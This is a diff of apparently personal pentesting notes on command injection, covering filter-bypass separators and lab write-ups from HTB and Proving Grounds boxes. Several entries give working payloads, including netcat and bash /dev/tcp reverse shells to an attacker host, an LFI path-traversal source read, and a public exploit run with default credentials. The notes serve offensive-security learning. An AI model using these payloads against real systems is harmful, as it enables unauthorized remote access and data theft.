@@ -15,7 +15,7 @@ $(id)
 %0aid
 ```
 
-Try each separator — different apps filter different characters.
+Try each separator - different apps filter different characters.
 
 ## Blind Detection
 
@@ -60,7 +60,7 @@ w"h"o"a"mi
 
 ```bash
 # Use env variables
-${PATH:0:1}  # = /
+${PATH:0:1} # = /
 ```
 
 ## Reverse Shell from Injection
@@ -89,28 +89,28 @@ For more shells see [[Reverse-Shells]].
 
 ## From Your Boxes
 
-> **Mentor** (HTB) — JSON API command injection via semicolons in path parameter
-> - What worked: `{"path":"test;ping -c 1 ATTACKER_IP;"}` — trailing semicolon was required
+> **Mentor** (HTB) - JSON API command injection via semicolons in path parameter
+> - What worked: `{"path":"test;ping -c 1 ATTACKER_IP;"}` - trailing semicolon was required
 > - Revshell: Standard bash/base64 shells failed (Docker), Python3 shortest revshell worked
 > - Lesson: Always try trailing semicolons and test with ping+tcpdump before going for RCE
 
-> **XposedAPI** (PG) — Python `os.system()` injection via unvalidated `url` parameter in `/update` endpoint
+> **XposedAPI** (PG) - Python `os.system()` injection via unvalidated `url` parameter in `/update` endpoint
 > - What worked: `{"user":"clumsyadmin","url":"http://KALI/test;nc KALI 53 -e /bin/bash"}`
 > - Used LFI first to read source code (`/logs?file=../../../main.py`) and confirm the vulnerable `os.system("curl {}".format(data['url']))` call
-> - Lesson: Chain LFI with command injection — read source to find the injection sink
+> - Lesson: Chain LFI with command injection - read source to find the injection sink
 
-> **Hetemit** (PG) — Python `eval()` endpoint accepting arbitrary code via POST `code=` parameter
+> **Hetemit** (PG) - Python `eval()` endpoint accepting arbitrary code via POST `code=` parameter
 > - What worked: `curl -X POST --data "code=os.system('nc -e /bin/bash KALI 18000')" http://TARGET:50000/verify`
 > - Lesson: If an endpoint evaluates code (returns `4` for `2*2`), go straight to `os.system()`
 
-> **Networked** (HTB) — Network script injection via user input passed to ifcfg config
+> **Networked** (HTB) - Network script injection via user input passed to ifcfg config
 > - What worked: Supplying `a /bin/bash` as argument to a sudo script that wrote to ifcfg files
 > - Lesson: Any script that writes user input into system config files is a command injection target
 
-> **QuackerJack** (PG) — rConfig 3.9.4 authenticated command injection via `search.crud.php`
+> **QuackerJack** (PG) - rConfig 3.9.4 authenticated command injection via `search.crud.php`
 > - What worked: `python3 48241.py https://TARGET:8081 admin abgrtyu KALI 80`
 > - Lesson: After finding default/weak creds on admin panels, always search for authenticated RCE exploits
 
-> **Precious** (HTB) — Ruby PDFKit command injection via backticks in URL parameter
+> **Precious** (HTB) - Ruby PDFKit command injection via backticks in URL parameter
 > - What worked: `` http://TARGET/?name=%20`bash -c "bash -i >& /dev/tcp/KALI/443 0>&1"` ``
 > - Lesson: PDF generators that accept URLs are prime command injection targets via backtick injection
